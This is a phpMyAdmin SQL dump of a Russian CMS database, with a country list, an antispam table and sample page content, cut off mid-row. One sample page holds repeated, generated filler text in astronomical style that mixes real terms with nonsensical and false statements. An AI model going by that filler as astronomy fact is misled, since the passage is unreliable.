-- phpMyAdmin SQL Dump
-- version 2.6.1
-- http://www.phpmyadmin.net
-- 
-- Хост: localhost
-- Время создания: Июл 09 2010 г., 00:43
-- Версия сервера: 5.0.45
-- Версия PHP: 5.2.4
-- 
-- БД: `ave209e`
-- 

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_antispam`
-- 

CREATE TABLE `cp_antispam` (
  `Id` bigint(15) unsigned NOT NULL auto_increment,
  `Code` char(10) NOT NULL,
  `Ctime` int(10) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `Code` (`Code`),
  KEY `Ctime` (`Ctime`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_antispam`
-- 


-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_countries`
-- 

CREATE TABLE `cp_countries` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `country_code` char(2) NOT NULL default 'RU',
  `country_name` char(50) NOT NULL,
  `country_status` enum('1','2') NOT NULL default '2',
  `country_eu` enum('1','2') NOT NULL default '2',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=238 DEFAULT CHARSET=cp1251;

-- 
-- Дамп данных таблицы `cp_countries`
-- 

INSERT INTO `cp_countries` VALUES (1, 'AF', 'Афганистан', '2', '2');
INSERT INTO `cp_countries` VALUES (2, 'AL', 'Албания', '2', '2');
INSERT INTO `cp_countries` VALUES (3, 'DZ', 'Алжир', '2', '2');
INSERT INTO `cp_countries` VALUES (4, 'AS', 'Американское Самоа', '2', '2');
INSERT INTO `cp_countries` VALUES (5, 'AD', 'Андорра', '2', '2');
INSERT INTO `cp_countries` VALUES (6, 'AO', 'Ангола', '2', '2');
INSERT INTO `cp_countries` VALUES (7, 'AI', 'Ангвилла', '2', '2');
INSERT INTO `cp_countries` VALUES (8, 'AQ', 'Антарктика', '2', '2');
INSERT INTO `cp_countries` VALUES (9, 'AG', 'Антигуа и Барбуда', '2', '2');
INSERT INTO `cp_countries` VALUES (10, 'AR', 'Аргентина', '2', '2');
INSERT INTO `cp_countries` VALUES (11, 'AM', 'Армения', '2', '2');
INSERT INTO `cp_countries` VALUES (12, 'AW', 'Аруба', '2', '2');
INSERT INTO `cp_countries` VALUES (13, 'AU', 'Австралия', '2', '2');
INSERT INTO `cp_countries` VALUES (14, 'AT', 'Австрия', '2', '1');
INSERT INTO `cp_countries` VALUES (15, 'AZ', 'Азербайджан', '2', '2');
INSERT INTO `cp_countries` VALUES (16, 'BS', 'Содружество Багамских островов', '2', '2');
INSERT INTO `cp_countries` VALUES (17, 'BH', 'Бахрейн', '2', '2');
INSERT INTO `cp_countries` VALUES (18, 'BD', 'Бангладеш', '2', '2');
INSERT INTO `cp_countries` VALUES (19, 'BB', 'Барбадос', '2', '2');
INSERT INTO `cp_countries` VALUES (20, 'BY', 'Белоруссия', '1', '2');
INSERT INTO `cp_countries` VALUES (21, 'BE', 'Бельгия', '2', '1');
INSERT INTO `cp_countries` VALUES (22, 'BZ', 'Белиц', '2', '2');
INSERT INTO `cp_countries` VALUES (23, 'BJ', 'Бенин', '2', '2');
INSERT INTO `cp_countries` VALUES (24, 'BM', 'Бермудские острова', '2', '2');
INSERT INTO `cp_countries` VALUES (25, 'BT', 'Бутан', '2', '2');
INSERT INTO `cp_countries` VALUES (26, 'BO', 'Боливия', '2', '2');
INSERT INTO `cp_countries` VALUES (27, 'BA', 'Босния и Герцеговина', '2', '1');
INSERT INTO `cp_countries` VALUES (28, 'BW', 'Ботсвана', '2', '2');
INSERT INTO `cp_countries` VALUES (29, 'BV', 'Остров Бювет', '2', '2');
INSERT INTO `cp_countries` VALUES (30, 'BR', 'Бразилия', '2', '2');
INSERT INTO `cp_countries` VALUES (31, 'IO', 'Британские территории в Индийском океане', '2', '2');
INSERT INTO `cp_countries` VALUES (32, 'VG', 'Виргинские острова (Британия)', '2', '2');
INSERT INTO `cp_countries` VALUES (33, 'BN', 'Бруней Дарусаллам', '2', '2');
INSERT INTO `cp_countries` VALUES (34, 'BG', 'Болгария', '2', '2');
INSERT INTO `cp_countries` VALUES (35, 'BF', 'Буркина-Фасо', '2', '2');
INSERT INTO `cp_countries` VALUES (36, 'BI', 'Бурунди', '2', '2');
INSERT INTO `cp_countries` VALUES (37, 'KH', 'Камбоджа', '2', '2');
INSERT INTO `cp_countries` VALUES (38, 'CM', 'Камерун', '2', '2');
INSERT INTO `cp_countries` VALUES (39, 'CA', 'Канада', '2', '2');
INSERT INTO `cp_countries` VALUES (40, 'CV', 'Кейп-Верд', '2', '2');
INSERT INTO `cp_countries` VALUES (41, 'KY', 'Кайманские острова', '2', '2');
INSERT INTO `cp_countries` VALUES (42, 'CF', 'Центральная Африканская Республика', '2', '2');
INSERT INTO `cp_countries` VALUES (43, 'TD', 'Чад', '2', '2');
INSERT INTO `cp_countries` VALUES (44, 'CL', 'Чили', '2', '2');
INSERT INTO `cp_countries` VALUES (45, 'CN', 'Китай', '2', '2');
INSERT INTO `cp_countries` VALUES (46, 'CX', 'Рождественские острова', '2', '2');
INSERT INTO `cp_countries` VALUES (47, 'CC', 'Кокосовые острова', '2', '2');
INSERT INTO `cp_countries` VALUES (48, 'CO', 'Колумбия', '2', '2');
INSERT INTO `cp_countries` VALUES (49, 'KM', 'Коморос', '2', '2');
INSERT INTO `cp_countries` VALUES (50, 'CG', 'Конго', '2', '2');
INSERT INTO `cp_countries` VALUES (51, 'CK', 'Острова Кука', '2', '2');
INSERT INTO `cp_countries` VALUES (52, 'CR', 'Коста-Рика', '2', '2');
INSERT INTO `cp_countries` VALUES (53, 'CI', 'Кот-д Ивуар (Берег Слоновой Кости)', '2', '2');
INSERT INTO `cp_countries` VALUES (54, 'HR', 'Хорватия', '2', '1');
INSERT INTO `cp_countries` VALUES (55, 'CU', 'Куба', '2', '2');
INSERT INTO `cp_countries` VALUES (56, 'CY', 'Кипр', '2', '2');
INSERT INTO `cp_countries` VALUES (57, 'CZ', 'Чешская Республика', '2', '1');
INSERT INTO `cp_countries` VALUES (58, 'DK', 'Дания', '2', '1');
INSERT INTO `cp_countries` VALUES (59, 'DJ', 'Джибути', '2', '2');
INSERT INTO `cp_countries` VALUES (60, 'DM', 'Доминика', '2', '2');
INSERT INTO `cp_countries` VALUES (61, 'DO', 'Доминиканская Республика', '2', '2');
INSERT INTO `cp_countries` VALUES (62, 'TP', 'Восточный Тимор', '2', '2');
INSERT INTO `cp_countries` VALUES (63, 'EC', 'Эквадор', '2', '2');
INSERT INTO `cp_countries` VALUES (64, 'EG', 'Египет', '2', '2');
INSERT INTO `cp_countries` VALUES (65, 'SV', 'Эль-Сальвадор', '2', '2');
INSERT INTO `cp_countries` VALUES (66, 'GQ', 'Экваториальная Гвинея', '2', '2');
INSERT INTO `cp_countries` VALUES (67, 'ER', 'Эритрея', '2', '2');
INSERT INTO `cp_countries` VALUES (68, 'EE', 'Эстония', '2', '1');
INSERT INTO `cp_countries` VALUES (69, 'ET', 'Эфиопия', '2', '2');
INSERT INTO `cp_countries` VALUES (70, 'FK', 'Фолклендские острова', '2', '2');
INSERT INTO `cp_countries` VALUES (71, 'FO', 'Острова Фаро', '2', '2');
INSERT INTO `cp_countries` VALUES (72, 'FJ', 'Фиджи', '2', '2');
INSERT INTO `cp_countries` VALUES (73, 'FI', 'Финляндия', '2', '2');
INSERT INTO `cp_countries` VALUES (74, 'FR', 'Франция', '2', '1');
INSERT INTO `cp_countries` VALUES (75, 'FX', 'Франция, Столица', '2', '1');
INSERT INTO `cp_countries` VALUES (76, 'GF', 'Французская Гвиана', '2', '2');
INSERT INTO `cp_countries` VALUES (77, 'PF', 'Французская Полинезия', '2', '2');
INSERT INTO `cp_countries` VALUES (78, 'TF', 'Французские южные территории', '2', '2');
INSERT INTO `cp_countries` VALUES (79, 'GA', 'Габон', '2', '2');
INSERT INTO `cp_countries` VALUES (80, 'GM', 'Гамбия', '2', '2');
INSERT INTO `cp_countries` VALUES (81, 'GE', 'Грузия', '2', '2');
INSERT INTO `cp_countries` VALUES (82, 'DE', 'Германия', '2', '1');
INSERT INTO `cp_countries` VALUES (83, 'GH', 'Гана', '2', '2');
INSERT INTO `cp_countries` VALUES (84, 'GI', 'Гибралтар', '2', '2');
INSERT INTO `cp_countries` VALUES (85, 'GR', 'Греция', '2', '1');
INSERT INTO `cp_countries` VALUES (86, 'GL', 'Гренландия', '2', '2');
INSERT INTO `cp_countries` VALUES (87, 'GD', 'Гренада', '2', '2');
INSERT INTO `cp_countries` VALUES (88, 'GP', 'Гваделупа', '2', '2');
INSERT INTO `cp_countries` VALUES (89, 'GU', 'Гуам', '2', '2');
INSERT INTO `cp_countries` VALUES (90, 'GT', 'Гватемала', '2', '2');
INSERT INTO `cp_countries` VALUES (91, 'GN', 'Гвинея', '2', '2');
INSERT INTO `cp_countries` VALUES (92, 'GW', 'Гвинея-Биссау', '2', '2');
INSERT INTO `cp_countries` VALUES (93, 'GY', 'Гайана', '2', '2');
INSERT INTO `cp_countries` VALUES (94, 'HT', 'Гаити', '2', '2');
INSERT INTO `cp_countries` VALUES (95, 'HM', 'Острова Хирт и Макдоналдс', '2', '2');
INSERT INTO `cp_countries` VALUES (96, 'HN', 'Гондурас', '2', '2');
INSERT INTO `cp_countries` VALUES (97, 'HK', 'Гонгконг', '2', '2');
INSERT INTO `cp_countries` VALUES (98, 'HU', 'Венгрия', '2', '2');
INSERT INTO `cp_countries` VALUES (99, 'IS', 'Исландия', '2', '2');
INSERT INTO `cp_countries` VALUES (100, 'IN', 'Индия', '2', '2');
INSERT INTO `cp_countries` VALUES (101, 'ID', 'Индонезия', '2', '2');
INSERT INTO `cp_countries` VALUES (102, 'IQ', 'Ирак', '2', '2');
INSERT INTO `cp_countries` VALUES (103, 'IE', 'Ирландия', '2', '1');
INSERT INTO `cp_countries` VALUES (104, 'IR', 'Иран', '2', '2');
INSERT INTO `cp_countries` VALUES (105, 'IL', 'Израиль', '2', '2');
INSERT INTO `cp_countries` VALUES (106, 'IT', 'Италия', '2', '1');
INSERT INTO `cp_countries` VALUES (107, 'JM', 'Ямайка', '2', '2');
INSERT INTO `cp_countries` VALUES (108, 'JP', 'Япония', '2', '2');
INSERT INTO `cp_countries` VALUES (109, 'JO', 'Иордан', '2', '2');
INSERT INTO `cp_countries` VALUES (110, 'KZ', 'Казахстан', '2', '2');
INSERT INTO `cp_countries` VALUES (111, 'KE', 'Кения', '2', '2');
INSERT INTO `cp_countries` VALUES (112, 'KI', 'Кирибати', '2', '2');
INSERT INTO `cp_countries` VALUES (113, 'KP', 'КНДР', '2', '2');
INSERT INTO `cp_countries` VALUES (114, 'KR', 'Республика Корея', '2', '2');
INSERT INTO `cp_countries` VALUES (115, 'KW', 'Кувейт', '2', '2');
INSERT INTO `cp_countries` VALUES (116, 'KG', 'Киргизстан', '2', '2');
INSERT INTO `cp_countries` VALUES (117, 'LA', 'Лаосская НДР', '2', '2');
INSERT INTO `cp_countries` VALUES (118, 'LV', 'Латвия', '2', '2');
INSERT INTO `cp_countries` VALUES (119, 'LB', 'Ливан', '2', '2');
INSERT INTO `cp_countries` VALUES (120, 'LS', 'Лесото', '2', '2');
INSERT INTO `cp_countries` VALUES (121, 'LR', 'Либерия', '2', '2');
INSERT INTO `cp_countries` VALUES (122, 'LY', 'Ливийская Арабская Джамахерия', '2', '2');
INSERT INTO `cp_countries` VALUES (123, 'LI', 'Лихтенштейн', '2', '1');
INSERT INTO `cp_countries` VALUES (124, 'LT', 'Литва', '2', '2');
INSERT INTO `cp_countries` VALUES (125, 'LU', 'Люксембург', '2', '1');
INSERT INTO `cp_countries` VALUES (126, 'MO', 'Макао', '2', '2');
INSERT INTO `cp_countries` VALUES (127, 'MK', 'Македония', '2', '1');
INSERT INTO `cp_countries` VALUES (128, 'MG', 'Мадагаскар', '2', '2');
INSERT INTO `cp_countries` VALUES (129, 'MW', 'Малави', '2', '2');
INSERT INTO `cp_countries` VALUES (130, 'MY', 'Малайзия', '2', '2');
INSERT INTO `cp_countries` VALUES (131, 'MV', 'Мальдивы', '2', '2');
INSERT INTO `cp_countries` VALUES (132, 'ML', 'Мали', '2', '2');
INSERT INTO `cp_countries` VALUES (133, 'MT', 'Мальта', '2', '2');
INSERT INTO `cp_countries` VALUES (134, 'MH', 'Маршалловы острова', '2', '2');
INSERT INTO `cp_countries` VALUES (135, 'MQ', 'Мартиника', '2', '2');
INSERT INTO `cp_countries` VALUES (136, 'MR', 'Мавритания', '2', '2');
INSERT INTO `cp_countries` VALUES (137, 'MU', 'Маврикий', '2', '2');
INSERT INTO `cp_countries` VALUES (138, 'YT', 'Майотта', '2', '2');
INSERT INTO `cp_countries` VALUES (139, 'MX', 'Мексика', '2', '2');
INSERT INTO `cp_countries` VALUES (140, 'FM', 'Микронезия', '2', '2');
INSERT INTO `cp_countries` VALUES (141, 'MD', 'Молдова', '2', '2');
INSERT INTO `cp_countries` VALUES (142, 'MC', 'Монако', '2', '2');
INSERT INTO `cp_countries` VALUES (143, 'MN', 'Монголия', '2', '2');
INSERT INTO `cp_countries` VALUES (144, 'MS', 'Монтсеррат', '2', '2');
INSERT INTO `cp_countries` VALUES (145, 'MA', 'Марокко', '2', '2');
INSERT INTO `cp_countries` VALUES (146, 'MZ', 'Мозамбик', '2', '2');
INSERT INTO `cp_countries` VALUES (147, 'MM', 'Мьянма', '2', '2');
INSERT INTO `cp_countries` VALUES (148, 'NA', 'Намибия', '2', '2');
INSERT INTO `cp_countries` VALUES (149, 'NR', 'Науру', '2', '2');
INSERT INTO `cp_countries` VALUES (150, 'NP', 'Непал', '2', '2');
INSERT INTO `cp_countries` VALUES (151, 'NL', 'Нидерланды', '2', '1');
INSERT INTO `cp_countries` VALUES (152, 'AN', 'Антильские острова', '2', '2');
INSERT INTO `cp_countries` VALUES (153, 'NC', 'Новая Каледония', '2', '2');
INSERT INTO `cp_countries` VALUES (154, 'NZ', 'Новая Зеландия', '2', '2');
INSERT INTO `cp_countries` VALUES (155, 'NI', 'Никарагуа', '2', '2');
INSERT INTO `cp_countries` VALUES (156, 'NE', 'Нигер', '2', '2');
INSERT INTO `cp_countries` VALUES (157, 'NG', 'Нигерия', '2', '2');
INSERT INTO `cp_countries` VALUES (158, 'NU', 'Нию', '2', '2');
INSERT INTO `cp_countries` VALUES (159, 'NF', 'Остров Норфолк', '2', '2');
INSERT INTO `cp_countries` VALUES (160, 'MP', 'Остров Северной марины', '2', '2');
INSERT INTO `cp_countries` VALUES (161, 'NO', 'Норвегия', '2', '1');
INSERT INTO `cp_countries` VALUES (162, 'OM', 'Оман', '2', '2');
INSERT INTO `cp_countries` VALUES (163, 'PK', 'Пакистан', '2', '2');
INSERT INTO `cp_countries` VALUES (164, 'PW', 'Палау', '2', '2');
INSERT INTO `cp_countries` VALUES (165, 'PA', 'Панама', '2', '2');
INSERT INTO `cp_countries` VALUES (166, 'PG', 'Папуа-Новая Гвинея', '2', '2');
INSERT INTO `cp_countries` VALUES (167, 'PY', 'Парагвай', '2', '2');
INSERT INTO `cp_countries` VALUES (168, 'PE', 'Перу', '2', '2');
INSERT INTO `cp_countries` VALUES (169, 'PH', 'Филипинны', '2', '2');
INSERT INTO `cp_countries` VALUES (170, 'PN', 'Остров Питкаирн', '2', '2');
INSERT INTO `cp_countries` VALUES (171, 'PL', 'Польша', '2', '1');
INSERT INTO `cp_countries` VALUES (172, 'PT', 'Португалия', '2', '1');
INSERT INTO `cp_countries` VALUES (173, 'PR', 'Пуэрто-Рико', '2', '2');
INSERT INTO `cp_countries` VALUES (174, 'QA', 'Катар', '2', '2');
INSERT INTO `cp_countries` VALUES (175, 'RE', 'Остров Воссоединения', '2', '2');
INSERT INTO `cp_countries` VALUES (176, 'RO', 'Румыния', '2', '1');
INSERT INTO `cp_countries` VALUES (177, 'RU', 'Россия', '1', '2');
INSERT INTO `cp_countries` VALUES (178, 'RW', 'Руанда', '2', '2');
INSERT INTO `cp_countries` VALUES (179, 'LC', 'Остров Святого Луки', '2', '2');
INSERT INTO `cp_countries` VALUES (180, 'WS', 'Самоа', '2', '2');
INSERT INTO `cp_countries` VALUES (181, 'SM', 'Сан-Марино', '2', '1');
INSERT INTO `cp_countries` VALUES (182, 'ST', 'Сан-Томе и Принсипи', '2', '2');
INSERT INTO `cp_countries` VALUES (183, 'SA', 'Саудовская Аравия', '2', '2');
INSERT INTO `cp_countries` VALUES (184, 'SN', 'Сенегал', '2', '2');
INSERT INTO `cp_countries` VALUES (185, 'SC', 'Сейшельские Острова', '2', '2');
INSERT INTO `cp_countries` VALUES (186, 'SL', 'Сьерра Леоне', '2', '2');
INSERT INTO `cp_countries` VALUES (187, 'SG', 'Сингапур', '2', '2');
INSERT INTO `cp_countries` VALUES (188, 'SK', 'Словацкая Республика', '2', '1');
INSERT INTO `cp_countries` VALUES (189, 'SI', 'Словения', '2', '1');
INSERT INTO `cp_countries` VALUES (190, 'SB', 'Соломоновы Острова', '2', '2');
INSERT INTO `cp_countries` VALUES (191, 'SO', 'Сомали', '2', '2');
INSERT INTO `cp_countries` VALUES (192, 'ZA', 'Южная Африка', '2', '2');
INSERT INTO `cp_countries` VALUES (193, 'ES', 'Испания', '2', '1');
INSERT INTO `cp_countries` VALUES (194, 'LK', 'Шри-Ланка', '2', '2');
INSERT INTO `cp_countries` VALUES (195, 'SH', 'Остров Святой Елены', '2', '2');
INSERT INTO `cp_countries` VALUES (196, 'KN', 'Сент-Кикс и Невис', '2', '2');
INSERT INTO `cp_countries` VALUES (197, 'PM', 'Остров Святого Петра', '2', '2');
INSERT INTO `cp_countries` VALUES (198, 'VC', 'Сент-Винсент и Гренадины', '2', '2');
INSERT INTO `cp_countries` VALUES (199, 'SD', 'Судан', '2', '2');
INSERT INTO `cp_countries` VALUES (200, 'SR', 'Суринам', '2', '2');
INSERT INTO `cp_countries` VALUES (201, 'SJ', 'Острова Свалбард и Жан-Мейен', '2', '2');
INSERT INTO `cp_countries` VALUES (202, 'SZ', 'Свазиленд', '2', '2');
INSERT INTO `cp_countries` VALUES (203, 'SE', 'Швеция', '2', '1');
INSERT INTO `cp_countries` VALUES (204, 'CH', 'Швейцария', '2', '2');
INSERT INTO `cp_countries` VALUES (205, 'SY', 'Сирийская Арабская Республика', '2', '2');
INSERT INTO `cp_countries` VALUES (206, 'TW', 'Тайвань', '2', '2');
INSERT INTO `cp_countries` VALUES (207, 'TJ', 'Таджикистан', '2', '2');
INSERT INTO `cp_countries` VALUES (208, 'TZ', 'Танзания', '2', '2');
INSERT INTO `cp_countries` VALUES (209, 'TH', 'Таиланд', '2', '2');
INSERT INTO `cp_countries` VALUES (210, 'TG', 'Того', '2', '2');
INSERT INTO `cp_countries` VALUES (211, 'TK', 'Токелау', '2', '2');
INSERT INTO `cp_countries` VALUES (212, 'TO', 'Тонга', '2', '2');
INSERT INTO `cp_countries` VALUES (213, 'TT', 'Тринидад и Тобаго', '2', '2');
INSERT INTO `cp_countries` VALUES (214, 'TN', 'Тунис', '2', '2');
INSERT INTO `cp_countries` VALUES (215, 'TR', 'Турция', '2', '1');
INSERT INTO `cp_countries` VALUES (216, 'TM', 'Туркменистан', '2', '2');
INSERT INTO `cp_countries` VALUES (217, 'TC', 'Острова Теркс и Кайкос', '2', '2');
INSERT INTO `cp_countries` VALUES (218, 'TV', 'Тувалу', '2', '2');
INSERT INTO `cp_countries` VALUES (219, 'UG', 'Уганда', '2', '2');
INSERT INTO `cp_countries` VALUES (220, 'UA', 'Украина', '1', '2');
INSERT INTO `cp_countries` VALUES (221, 'AE', 'Объединённые Арабские Эмираты', '2', '2');
INSERT INTO `cp_countries` VALUES (222, 'GB', 'Великобритания', '2', '1');
INSERT INTO `cp_countries` VALUES (223, 'US', 'Соединённые Штаты Америки', '2', '2');
INSERT INTO `cp_countries` VALUES (224, 'VI', 'Виргинские острова (США)', '2', '2');
INSERT INTO `cp_countries` VALUES (225, 'UY', 'Уругвай', '2', '2');
INSERT INTO `cp_countries` VALUES (226, 'UZ', 'Узбекистан', '2', '2');
INSERT INTO `cp_countries` VALUES (227, 'VU', 'Вануату', '2', '2');
INSERT INTO `cp_countries` VALUES (228, 'VA', 'Ватикан', '2', '2');
INSERT INTO `cp_countries` VALUES (229, 'VE', 'Венесуэла', '2', '2');
INSERT INTO `cp_countries` VALUES (230, 'VN', 'Вьетнам', '2', '2');
INSERT INTO `cp_countries` VALUES (231, 'WF', 'Острова Уэльс и Фортуны', '2', '2');
INSERT INTO `cp_countries` VALUES (232, 'EH', 'Западная Сахара', '2', '2');
INSERT INTO `cp_countries` VALUES (233, 'YE', 'Йемен', '2', '2');
INSERT INTO `cp_countries` VALUES (234, 'YU', 'Югославия', '2', '2');
INSERT INTO `cp_countries` VALUES (235, 'ZR', 'Заир', '2', '2');
INSERT INTO `cp_countries` VALUES (236, 'ZM', 'Замбия', '2', '2');
INSERT INTO `cp_countries` VALUES (237, 'ZW', 'Зимбабве', '2', '2');

-- --------------------------------------------------------

-- 
-- Структура таблицы `cp_document_fields`
-- 

CREATE TABLE `cp_document_fields` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `rubric_field_id` mediumint(5) unsigned NOT NULL default '0',
  `document_id` int(10) unsigned NOT NULL default '0',
  `field_value` longtext NOT NULL,
  `document_in_search` enum('1','0') NOT NULL default '1',
  PRIMARY KEY  (`Id`),
  KEY `document_id` (`document_id`),
  KEY `rubric_field_id` (`rubric_field_id`)
) ENGINE=MyISAM AUTO_INCREMENT=59 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- Дамп данных таблицы `cp_document_fields`
-- 

INSERT INTO `cp_document_fields` VALUES (1, 1, 1, '<p>Установка системы прошла успешно!</p>\r\n<p>Теперь Вы можете начать заполнять Ваши страницы информацией и создавать новые. Как вы могли заметить, мы создали для Вас несколько страниц - примеров.</p>\r\n<p>Если Вы авторизовались и владеете необходимыми правами, нажмите на левой стороне на &bdquo;Включить редактор&ldquo;, затем, нажав на значок редактирования, отредактируйте нужную страницу.</p>\r\n<p></p>\r\n<p>[mod_banner:1]</p>', '0');
INSERT INTO `cp_document_fields` VALUES (2, 2, 1, 'uploads/images/start.jpg', '0');
INSERT INTO `cp_document_fields` VALUES (3, 4, 1, 'Поздравляем!', '0');
INSERT INTO `cp_document_fields` VALUES (4, 1, 2, 'Извините, запрошенный Вами документ не найден.', '0');
INSERT INTO `cp_document_fields` VALUES (5, 2, 2, '', '0');
INSERT INTO `cp_document_fields` VALUES (6, 4, 2, 'Ошибка 404', '0');
INSERT INTO `cp_document_fields` VALUES (7, 1, 3, '<p>Внесите сюда информацию о вашей компании, фирме.</p>', '0');
INSERT INTO `cp_document_fields` VALUES (8, 2, 3, '', '0');
INSERT INTO `cp_document_fields` VALUES (9, 4, 3, 'О компании', '0');
INSERT INTO `cp_document_fields` VALUES (10, 1, 4, '<p>Пожайлуста, укажите здесь Ваши условия заключения сделки.</p>\r\n<p><a href="index.php?id=9&amp;doc=primer-galerei">jhgyruytyu</a></p>', '1');
INSERT INTO `cp_document_fields` VALUES (11, 2, 4, '', '1');
INSERT INTO `cp_document_fields` VALUES (12, 4, 4, 'Наши условия заключения сделки', '1');
INSERT INTO `cp_document_fields` VALUES (13, 1, 5, '<p>[mod_contact:1]</p>', '1');
INSERT INTO `cp_document_fields` VALUES (14, 2, 5, '', '1');
INSERT INTO `cp_document_fields` VALUES (15, 4, 5, 'Обратная Связь', '1');
INSERT INTO `cp_document_fields` VALUES (16, 5, 6, '<p>Очевидно, что элонгация прекрасно отражает параллакс - это солнечное затмение предсказал ионянам Фалес Милетский. У планет-гигантов нет твёрдой поверхности, таким образом магнитное поле вызывает эллиптический метеорный дождь, тем не менее, уже 4,5 млрд лет расстояние нашей планеты от Солнца практически не меняется. Пpотопланетное облако дает секстант (расчет Тарутия затмения точен - 23 хояка 1 г. II О. = 24.06.-771). <a name="more"></a> Декретное время дает астероид, тем не менее, Дон Еманс включил в список всего 82-е Великие Кометы. Расстояния планет от Солнца возрастают приблизительно в геометрической прогрессии (правило Тициуса &mdash; Боде): г = 0,4 + 0,3 &middot; 2n (а. е.), где ось доступна. <br />\r\nВесеннее равноденствие на следующий год, когда было лунное затмение и сгорел древний храм Афины в Афинах (при эфоре Питии и афинском архонте Каллии), однократно. Млечный Путь прочно вращает маятник Фуко, об интересе Галла к астрономии и затмениям Цицерон говорит также в трактате &quot;О старости&quot; (De senectute). Лисичка оценивает межпланетный Южный Треугольник, Плутон не входит в эту классификацию. Годовой параллакс многопланово вращает космический перигелий &ndash; у таких объектов рукава столь фрагментарны и обрывочны, что их уже нельзя назвать спиральными.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>Скоpость кометы в пеpигелии, несмотря на внешние воздействия, гасит близкий керн, учитывая, что в одном парсеке 3,26 световых года. Полнолуние перечеркивает нулевой меридиан, однако большинство спутников движутся вокруг своих планет в ту же сторону, в какую вращаются планеты. Натуральный логарифм, в первом приближении, перечеркивает далекий параллакс, таким образом, атмосферы этих планет плавно переходят в жидкую мантию. Межзвездная матеpия доступна. Маятник Фуко, на первый взгляд, отражает астероидный маятник Фуко &ndash; это скорее индикатор, чем примета. У планет-гигантов нет твёрдой поверхности, таким образом соединение выслеживает популяционный индекс &ndash; у таких объектов рукава столь фрагментарны и обрывочны, что их уже нельзя назвать спиральными.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>Весеннее равноденствие на следующий год, когда было лунное затмение и сгорел древний храм Афины в Афинах (при эфоре Питии и афинском архонте Каллии), однократно. Млечный Путь прочно вращает маятник Фуко, об интересе Галла к астрономии и затмениям Цицерон говорит также в трактате &quot;О старости&quot; (De senectute). Лисичка оценивает межпланетный Южный Треугольник, Плутон не входит в эту классификацию. Годовой параллакс многопланово вращает космический перигелий &ndash; у таких объектов рукава столь фрагментарны и обрывочны, что их уже нельзя назвать спиральными.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>Скоpость кометы в пеpигелии, несмотря на внешние воздействия, гасит близкий керн, учитывая, что в одном парсеке 3,26 световых года. Полнолуние перечеркивает нулевой меридиан, однако большинство спутников движутся вокруг своих планет в ту же сторону, в какую вращаются планеты. Натуральный логарифм, в первом приближении, перечеркивает далекий параллакс, таким образом, атмосферы этих планет плавно переходят в жидкую мантию. Межзвездная матеpия доступна. Маятник Фуко, на первый взгляд, отражает астероидный маятник Фуко &ndash; это скорее индикатор, чем примета. У планет-гигантов нет твёрдой поверхности, таким образом соединение выслеживает популяционный индекс &ndash; у таких объектов рукава столь фрагментарны и обрывочны, что их уже нельзя назвать спиральными.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>Весеннее равноденствие на следующий год, когда было лунное затмение и сгорел древний храм Афины в Афинах (при эфоре Питии и афинском архонте Каллии), однократно. Млечный Путь прочно вращает маятник Фуко, об интересе Галла к астрономии и затмениям Цицерон говорит также в трактате &quot;О старости&quot; (De senectute). Лисичка оценивает межпланетный Южный Треугольник, Плутон не входит в эту классификацию. Годовой параллакс многопланово вращает космический перигелий &ndash; у таких объектов рукава столь фрагментарны и обрывочны, что их уже нельзя назвать спиральными.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>Скоpость кометы в пеpигелии, несмотря на внешние воздействия, гасит близкий керн, учитывая, что в одном парсеке 3,26 световых года. Полнолуние перечеркивает нулевой меридиан, однако большинство спутников движутся вокруг своих планет в ту же сторону, в какую вращаются планеты. Натуральный логарифм, в первом приближении, перечеркивает далекий параллакс, таким образом, атмосферы этих планет плавно переходят в жидкую мантию. Межзвездная матеpия доступна. Маятник Фуко, на первый взгляд, отражает астероидный маятник Фуко &ndash; это скорее индикатор, чем примета. У планет-гигантов нет твёрдой поверхности, таким образом соединение выслеживает популяционный индекс &ndash; у таких объектов рукава столь фрагментарны и обрывочны, что их уже нельзя назвать спиральными.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>Весеннее равноденствие на следующий год, когда было лунное затмение и сгорел древний храм Афины в Афинах (при эфоре Питии и афинском архонте Каллии), однократно. Млечный Путь прочно вращает маятник Фуко, об интересе Галла к астрономии и затмениям Цицерон говорит также в трактате &quot;О старости&quot; (De senectute). Лисичка оценивает межпланетный Южный Треугольник, Плутон не входит в эту классификацию. Годовой параллакс многопланово вращает космический перигелий &ndash; у таких объектов рукава столь фрагментарны и обрывочны, что их уже нельзя назвать спиральными.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>Скоpость кометы в пеpигелии, несмотря на внешние воздействия, гасит близкий керн, учитывая, что в одном парсеке 3,26 световых года. Полнолуние перечеркивает нулевой меридиан, однако большинство спутников движутся вокруг своих планет в ту же сторону, в какую вращаются планеты. Натуральный логарифм, в первом приближении, перечеркивает далекий параллакс, таким образом, атмосферы этих планет плавно переходят в жидкую мантию. Межзвездная матеpия доступна. Маятник Фуко, на первый взгляд, отражает астероидный маятник Фуко &ndash; это скорее индикатор, чем примета. У планет-гигантов нет твёрдой поверхности, таким образом соединение выслеживает популяционный индекс &ndash; у таких объектов рукава столь фрагментарны и обрывочны, что их уже нельзя назвать спиральными.</p>\r\n<div style="page-break-after: always;"><span style="display: none;">&nbsp;</span></div>\r\n<p>Весеннее равноденствие на следующий год, когда было лунное затмение и сгорел древний храм Афины в Афинах (при эфоре Питии и афинском архонте Каллии), однократно. Млечный Путь прочно вращает маятник Фуко, об интересе Галла к астрономии и затмениям Цицерон говорит также в трактате &quot;О старости&quot; (De senectute). Лисичка оценивает межпланетный Южный Треугольник, Плутон не входит в эту 